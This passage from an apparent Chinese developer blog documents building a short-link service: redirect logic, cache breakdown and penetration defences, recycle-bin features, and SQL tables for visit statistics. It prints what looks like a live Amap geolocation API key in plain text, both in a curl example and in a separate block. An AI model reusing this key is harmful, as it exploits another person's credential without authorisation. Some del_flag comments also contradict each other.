class="number">0</span>)</span><br><span class="line">            .eq(ShortLinkDO::getEnableStatus, <span class="number">0</span>);</span><br><span class="line">    <span class="type">ShortLinkDO</span> <span class="variable">shortLinkDO</span> <span class="operator">=</span> baseMapper.selectOne(queryWrapper);</span><br><span class="line">    <span class="keyword">if</span> (shortLinkDO != <span class="literal">null</span>) &#123;</span><br><span class="line">        ((HttpServletResponse) response).sendRedirect(shortLinkDO.getOriginUrl());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-10-21T14:58:57.348+08:00  INFO 11460 --- [nio-8001-exec-1] ShardingSphere-SQL                       : Actual SQL: ds_0 ::: INSERT INTO t_link_9  ( id,</span><br><span class="line">domain,</span><br><span class="line">short_uri,</span><br><span class="line">full_short_url,</span><br><span class="line">origin_url,</span><br><span class="line"></span><br><span class="line">gid,</span><br><span class="line">enable_status,</span><br><span class="line">created_type,</span><br><span class="line">valid_date_type,</span><br><span class="line"></span><br><span class="line">`describe`,</span><br><span class="line"></span><br><span class="line">create_time,</span><br><span class="line">update_time,</span><br><span class="line">del_flag )  VALUES  (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) ::: [1848257647141314561, https://s.c1ns.cn, 1QHVPZ, https://s.c1ns.cn/1QHVPZ, https://www.ustb111.edu.cn/, p3kcso, 0, 0, 1, test111, 2024-10-21 14:58:56.704, 2024-10-21 14:58:56.704, 0]</span><br><span class="line">2024-10-21T14:58:57.384+08:00  INFO 11460 --- [nio-8001-exec-1] ShardingSphere-SQL                       : Logic SQL: INSERT INTO t_link_goto  ( id,</span><br><span class="line">gid,</span><br><span class="line">full_short_url )  VALUES  ( ?,</span><br><span class="line">?,</span><br><span class="line">? )</span><br><span class="line">2024-10-21T14:58:57.385+08:00  INFO 11460 --- [nio-8001-exec-1] ShardingSphere-SQL                       : Actual SQL: ds_0 ::: INSERT INTO t_link_goto_5  ( id,</span><br><span class="line">gid,</span><br><span class="line">full_short_url )  VALUES  (?, ?, ?) ::: [1848257649997635586, p3kcso, https://s.c1ns.cn/1QHVPZ]</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/b5f4bd3d48a867dcbb9cffecd0350898863efd68">feature:短链接跳转功能实现 · b5f4bd3 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接跳转原始链接功能（缓存击穿）"><a href="#短链接跳转原始链接功能（缓存击穿）" class="headerlink" title="短链接跳转原始链接功能（缓存击穿）"></a>短链接跳转原始链接功能（缓存击穿）</h3><p>解决缓存击穿的主要方法分为三种：<strong>热点数据永不过期、热点数据预加载以及加分布式锁</strong>。</p>
<p><strong>双重判定锁</strong>：首先加分布式锁，防止缓存过期之后的大量请求过来的缓存穿透问题；同时再加上一个双重判定锁，可以让只有第一个拿到锁的请求进行缓存重构，之后拿到锁的请求直接查询缓存即可，提高了程序运行效率</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/f35c37af62462c49cd6fa57049746bfd076ba2c8">feature:短链接跳转原始链接功能（防止缓存击穿） · f35c37a · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接跳转原始链接功能（缓存穿透）"><a href="#短链接跳转原始链接功能（缓存穿透）" class="headerlink" title="短链接跳转原始链接功能（缓存穿透）"></a>短链接跳转原始链接功能（缓存穿透）</h3><p>缓存穿透是指在<strong>缓存中查询一个一定不存在的数据</strong>，由于缓存不命中，导致请求直接访问数据库，这将导致大量的请求打到数据库上，可能会导致数据库压力过大。</p>
<p>通常情况下，缓存是<strong>为了提高数据访问速度，避免频繁查询数据库</strong>。但如果攻击者故意请求缓存中不存在的数据，就会导致缓存不命中，请求直接访问数据库。</p>
<p>解决方法：</p>
<ol>
<li><p>空对象值缓存</p>
</li>
<li><p>使用锁</p>
</li>
<li><p>布隆过滤器</p>
</li>
<li><p>组合方案</p>
</li>
</ol>
<p>项目采用方法：如果说缓存不存在，那么就通过布隆过滤器进行初步筛选，然后<strong>判断是否存在缓存空值，如果存在直接返回失败</strong>。如果不存在缓存空值，使用锁机制避免多个相同请求同时访问数据库。最后，<strong>如果请求数据库为空，那么将为空的 Key 进行空对象值缓存</strong>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241021202146262.png" alt="image-20241021202146262"></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/7061f2cb8b3e82048ec9a1ced814b54c73251058">feature:短链接跳转原始链接功能（防止缓存穿透） · 7061f2c · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接跳转原始链接功能（缓存预热）"><a href="#短链接跳转原始链接功能（缓存预热）" class="headerlink" title="短链接跳转原始链接功能（缓存预热）"></a>短链接跳转原始链接功能（缓存预热）</h3><p><strong>缓存预热</strong>是指在使用缓存之前，提前将数据加载到缓存中的过程</p>
<p><a href="https://blog.csdn.net/lucky_zbaby/article/details/113513086">时间单位的换算（秒，毫秒，微秒，纳秒，皮秒）_秒,毫秒,微秒,纳秒,皮秒-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/2e56c7f84d727b6d1420cf6e8add9921ec4fc833">feature:短链接创建进行缓存预热 · 2e56c7f · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接跳转原始链接功能（区分过期短链）"><a href="#短链接跳转原始链接功能（区分过期短链）" class="headerlink" title="短链接跳转原始链接功能（区分过期短链）"></a>短链接跳转原始链接功能（区分过期短链）</h3><p>短链接过期（使用短链接发现）之后存入GOTO_IS_NULL_SHORT_LINK_KEY 缓存中</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/f848eaca777cb2144ad2b6dfe4bb50a46ae9e1f6">feature:短链接跳转时，过了设置有效期，存入空值缓存中 · f848eac · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/cff81fc4920607b93e47e506323d07198b82dd34">feature:短链接跳转时，过了设置有效期，存入空值缓存中 · cff81fc · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/7eadf41546c18c13b35736d4ce504370318b0428">feature:ShortLinkServiceImpl增加log日志 · 7eadf41 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接不存在跳转指定页面功能"><a href="#短链接不存在跳转指定页面功能" class="headerlink" title="短链接不存在跳转指定页面功能"></a>短链接不存在跳转指定页面功能</h3><p><a href="https://blog.csdn.net/Lzy410992/article/details/115371017">Thymeleaf基本使用-CSDN博客</a></p>
<p>需要刷新一下maven依赖</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/34bd8b13d4cc13f3a6e5f5491e0dc5cb80523796">feature:短链接不存在跳转指定页面功能 · 34bd8b1 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="通过url获取网站标题"><a href="#通过url获取网站标题" class="headerlink" title="通过url获取网站标题"></a>通过url获取网站标题</h3><p><a href="https://blog.csdn.net/qq_41694906/article/details/129857848">Jsoup使用教程以及使用案例-CSDN博客</a></p>
<p>感觉jsoup相当于python的bs</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/49b75ab99dca8327eddf4a1490ae3ca6886e1897">feature:获取目标网站标题功能 · 49b75ab · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="获取目标网站图标功能"><a href="#获取目标网站图标功能" class="headerlink" title="获取目标网站图标功能"></a>获取目标网站图标功能</h3><p>正常来说图标应该存在MinIO这些里面，但这次先存对应url到数据库</p>
<p>正则匹配获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Element faviconLink = document.select(&quot;link[rel~=(?i)^(shortcut )?icon]&quot;).first();</span><br></pre></td></tr></table></figure>



<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/c0a0c4e8eaff53f6e2edf681930ec62f4679b1b9">feature:新增获取目标网站图标功能 · c0a0c4e · changchun&#x2F;shortlink - Gitee.com</a></p>
<h2 id="回收站管理"><a href="#回收站管理" class="headerlink" title="回收站管理"></a>回收站管理</h2><h3 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h3><ol>
<li>将短链接移至回收站；</li>
<li>回收站分页列表查询；</li>
<li>短链接从回收站恢复；</li>
<li>短链接从回收站删除。</li>
</ol>
<h3 id="短链接移至回收站功能"><a href="#短链接移至回收站功能" class="headerlink" title="短链接移至回收站功能"></a>短链接移至回收站功能</h3><p>也就是将enable status从0改为1</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/c12d7bd0320c64285b90a0e47597d91f873cf3ad">feature:开发短链接新增回收站功能 · c12d7bd · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="回收站分页功能实现"><a href="#回收站分页功能实现" class="headerlink" title="回收站分页功能实现"></a>回收站分页功能实现</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commits/master">提交 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="回收站恢复短链接功能"><a href="#回收站恢复短链接功能" class="headerlink" title="回收站恢复短链接功能"></a>回收站恢复短链接功能</h3><p>回收修改status，然后处理缓存，需要删除空白缓存。也可以缓存预热下（不过应该没必要）</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/de38ea8aef76d5ca50b21fa139599348d81a596b">feature:开发回收站恢复短链接功能 · de38ea8 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="回收站移除短链接功能"><a href="#回收站移除短链接功能" class="headerlink" title="回收站移除短链接功能"></a>回收站移除短链接功能</h3><p><a href="https://mybatisplus.vercel.app/guide/logic-delete.html">逻辑删除 | MyBatis-Plus</a></p>
<p>个人感觉配置逻辑删除不如自己写逻辑删除，配置不小心失效把数据删了就寄了</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/006eb6811fac649eca558f0afaa6d0368719984d">feature:回收站移除短链接功能 · 006eb68 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h2 id="短链接监控"><a href="#短链接监控" class="headerlink" title="短链接监控"></a>短链接监控</h2><h3 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h3><p><a href="https://developer.aliyun.com/article/807715">一文搞懂PV、UV、VV、IP及其关系与计算-阿里云开发者社区</a></p>
<p>基础访问</p>
<ul>
<li>访问次数</li>
<li>访问人数</li>
<li>IP数</li>
</ul>
<p>访问地区</p>
<ul>
<li>北京（地区）中国（国家）</li>
</ul>
<p><a href="https://ip-api.com/">https://ip-api.com</a></p>
<p><a href="https://lbs.amap.com/api/webservice/guide/api/ipconfig">IP定位-API文档-开发指南-Web服务 API | 高德地图API</a></p>
<ul>
<li>24小时分布</li>
<li>高频访问IP</li>
<li>一周分布</li>
<li>操作系统</li>
<li>访问浏览器</li>
<li>访客类型</li>
</ul>
<p>当选择一个特定的时间段时，”新访客” 指的是在该时间段内访问过短链接的人群中，有多少人是首次访问者。</p>
<p>相对应地，”老访客” 指的是在该时间段内访问过短链接的人群中，已经在之前访问过的人数。</p>
<p>可以选中当天的日期然后查看老访客的数量，如果老访客数量较多， 就说明您投放的短链接很受欢迎，您的用户会持续来访问。</p>
<ul>
<li>访问设备</li>
<li>访问网络</li>
</ul>
<h3 id="短链接统计模块数据库表设计"><a href="#短链接统计模块数据库表设计" class="headerlink" title="短链接统计模块数据库表设计"></a>短链接统计模块数据库表设计</h3><p>基本信息数据库对应创建数据库表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `link`.`t_link_access_stats`  (</span><br><span class="line">  `id` <span class="type">bigint</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `gid` <span class="type">varchar</span>(<span class="number">32</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_0900_ai_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">  `full_short_url` <span class="type">varchar</span>(<span class="number">128</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_0900_ai_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;完整短链接&#x27;</span>,</span><br><span class="line">  `<span class="type">date</span>` <span class="type">date</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;日期&#x27;</span>,</span><br><span class="line">  `pv` <span class="type">int</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问量&#x27;</span>,</span><br><span class="line">  `uv` <span class="type">int</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;独立访问数&#x27;</span>,</span><br><span class="line">  `uip` <span class="type">int</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;独立IP数&#x27;</span>,</span><br><span class="line">  `<span class="keyword">hour</span>` <span class="type">int</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;小时&#x27;</span>,</span><br><span class="line">  `weekday` <span class="type">int</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;星期&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span>,</span><br><span class="line">  `del_flag` tinyint(<span class="number">1</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除标识：0 未删除 1 已删除&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> InnoDB <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8mb4 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8mb4_0900_ai_ci ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br></pre></td></tr></table></figure>

<p>添加索引</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t_link_access_stats <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> INDEX `idx_unique_access_stats` (`full_short_url`,`gid`,`<span class="type">date</span>`,`<span class="keyword">hour</span>`) <span class="keyword">USING</span> BTREE;</span><br></pre></td></tr></table></figure>

<h3 id="统计短链接PV访问"><a href="#统计短链接PV访问" class="headerlink" title="统计短链接PV访问"></a>统计短链接PV访问</h3><p><a href="https://blog.csdn.net/zhou16333/article/details/95867827">Mysql:如果数据存在则更新，不存在则插入_mysql insert into select 存在则不更新不存在则更新是哪个语句-CSDN博客</a></p>
<p>存在则更新，不存在则新增</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span></span><br><span class="line">  t_link_access_stats (</span><br><span class="line">    full_short_url,</span><br><span class="line">    gid,</span><br><span class="line">    <span class="type">date</span>,</span><br><span class="line">    pv,</span><br><span class="line">    uv,</span><br><span class="line">    uip,</span><br><span class="line">    <span class="keyword">hour</span>,</span><br><span class="line">    weekday,</span><br><span class="line">    create_time,</span><br><span class="line">    update_time,</span><br><span class="line">    del_flag</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">VALUES</span>(</span><br><span class="line">    <span class="string">&#x27;nurl.ink/W5M7a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;siCwZo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2023-11-04&#x27;</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    NOW(),</span><br><span class="line">    NOW(),</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">  ) <span class="keyword">ON</span> DUPLICATE KEY</span><br><span class="line"><span class="keyword">UPDATE</span></span><br><span class="line">  pv <span class="operator">=</span> pv <span class="operator">+</span> <span class="number">1</span>,</span><br><span class="line">  uv <span class="operator">=</span> uv <span class="operator">+</span> <span class="number">2</span>,</span><br><span class="line">  uip <span class="operator">=</span> uip <span class="operator">+</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/c1173392619b1642e1c0fdaa062af65899b7e0a8">feature:统计短链接PV访问 · c117339 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计短链接UV访问"><a href="#统计短链接UV访问" class="headerlink" title="统计短链接UV访问"></a>统计短链接UV访问</h3><p><a href="https://blog.csdn.net/qusikao/article/details/136222662">Java并发基础：原子类之AtomicBoolean全面解析-CSDN博客</a></p>
<h3 id="统计短链接UV访问-1"><a href="#统计短链接UV访问-1" class="headerlink" title="统计短链接UV访问"></a>统计短链接UV访问</h3><p>通过cookie来进行判断，不过无法防止用户恶意修改cookie来刷访问量（其它成熟的短链接网站也无法避免）</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/5fabc59115a35c0493ea3bc6ebc70962700bb9d9">feature:短链接uv统计 · 5fabc59 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计短链接UIP访问"><a href="#统计短链接UIP访问" class="headerlink" title="统计短链接UIP访问"></a>统计短链接UIP访问</h3><p><a href="https://blog.csdn.net/weixin_65950231/article/details/130903477">Spring Boot获取客户端的IP地址_springboot 获取客户端ip-CSDN博客</a></p>
<p>判断缓存中是否存在对应ip，存在不加一，不存在加一</p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/b98acb02ca811b7f378bd9894611dcfa13a80d19">feature:短链接uip统计 · b98acb0 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计短链接地区"><a href="#统计短链接地区" class="headerlink" title="统计短链接地区"></a>统计短链接地区</h3><p><a href="https://lbs.amap.com/api/webservice/guide/api/ipconfig">IP定位-基础 API 文档-开发指南-Web服务 API | 高德地图API</a></p>
<p><a href="https://blog.csdn.net/zhebushibiaoshifu/article/details/139373736">申请高德地图API的Key并加以接口调用的方法_高德地图key-CSDN博客</a></p>
<p>curl “<a href="https://restapi.amap.com/v3/ip?ip=114.247.50.2&output=xml&key=b06e0bd0e2671845812d9d4c6b76a330">https://restapi.amap.com/v3/ip?ip=114.247.50.2&amp;output=xml&amp;key=b06e0bd0e2671845812d9d4c6b76a330</a>“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key</span><br><span class="line">b06e0bd0e2671845812d9d4c6b76a330</span><br></pre></td></tr></table></figure>

<p>地区数据库创建语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_link_locale_stats` (</span><br><span class="line">  `id` <span class="type">bigint</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `full_short_url` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">COLLATE</span> utf8mb4_general_ci <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;完整短链接&#x27;</span>,</span><br><span class="line">  `gid` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">COLLATE</span> utf8mb4_general_ci <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">  `<span class="type">date</span>` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;日期&#x27;</span>,</span><br><span class="line">  `cnt` <span class="type">int</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问量&#x27;</span>,</span><br><span class="line">  `province` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">COLLATE</span> utf8mb4_general_ci <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;省份名称&#x27;</span>,</span><br><span class="line">  `city` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">COLLATE</span> utf8mb4_general_ci <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;市名称&#x27;</span>,</span><br><span class="line">  `adcode` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">COLLATE</span> utf8mb4_general_ci <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;城市编码&#x27;</span>,</span><br><span class="line">  `country` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">COLLATE</span> utf8mb4_general_ci <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;国家标识&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span>,</span><br><span class="line">  `del_flag` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除标识 0表示删除 1表示未删除&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `idx_unique_locale_stats` (`full_short_url`,`gid`,`<span class="type">date</span>`,`adcode`,`province`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_general_ci;</span><br></pre></td></tr></table></figure>

<p>使用接口获取访问IP得到访问地址</p>
<h3 id="统计短链接操作系统访问"><a href="#统计短链接操作系统访问" class="headerlink" title="统计短链接操作系统访问"></a>统计短链接操作系统访问</h3><p>对应数据表创建语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_link_os_stats`</span><br><span class="line">(</span><br><span class="line">    `id`             <span class="type">bigint</span>   <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">    `full_short_url` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">COLLATE</span> utf8mb4_general_ci <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;完整短链接&#x27;</span>,</span><br><span class="line">    `gid`            <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">COLLATE</span> utf8mb4_general_ci  <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">    `<span class="type">date</span>`           <span class="type">date</span>                                    <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;日期&#x27;</span>,</span><br><span class="line">    `cnt`            <span class="type">int</span>                                     <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问量&#x27;</span>,</span><br><span class="line">    `os`             <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">COLLATE</span> utf8mb4_general_ci  <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;操作系统&#x27;</span>,</span><br><span class="line">    `create_time`    datetime                                <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    `update_time`    datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span>,</span><br><span class="line">    `del_flag`       tinyint(<span class="number">1</span>)                              <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除标识 0表示删除 1表示未删除&#x27;</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">    <span class="keyword">UNIQUE</span> KEY `idx_unique_locale_stats` (`full_short_url`, `gid`, `<span class="type">date</span>`, `os`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) COMMENT <span class="operator">=</span> <span class="string">&#x27;短链接监控操作系统访问状态&#x27;</span></span><br><span class="line">    ENGINE <span class="operator">=</span> InnoDB</span><br><span class="line">    <span class="keyword">DEFAULT</span> CHARSET <span class="operator">=</span> utf8mb4</span><br><span class="line">    <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8mb4_general_ci;</span><br></pre></td></tr></table></figure>

<p>关键语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getOs</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">userAgent</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (userAgent.toLowerCase().contains(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Windows&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userAgent.toLowerCase().contains(<span class="string">&quot;mac&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Mac OS&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userAgent.toLowerCase().contains(<span class="string">&quot;linux&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Linux&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userAgent.toLowerCase().contains(<span class="string">&quot;android&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Android&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userAgent.toLowerCase().contains(<span class="string">&quot;iphone&quot;</span>) || userAgent.toLowerCase().contains(<span class="string">&quot;ipad&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;iOS&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过User-Agent判断</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/ebf4c982b28a9c926f267f85066ccd54ea505c01">feature:统计操作系统 · ebf4c98 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计浏览器"><a href="#统计浏览器" class="headerlink" title="统计浏览器"></a>统计浏览器</h3><p>建表语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_link_browser_stats` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `full_short_url` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;完整短链接&#x27;</span>,</span><br><span class="line">  `gid` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;default&#x27;</span> COMMENT <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">  `<span class="type">date</span>` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;日期&#x27;</span>,</span><br><span class="line">  `cnt` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问量&#x27;</span>,</span><br><span class="line">  `browser` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;浏览器&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span 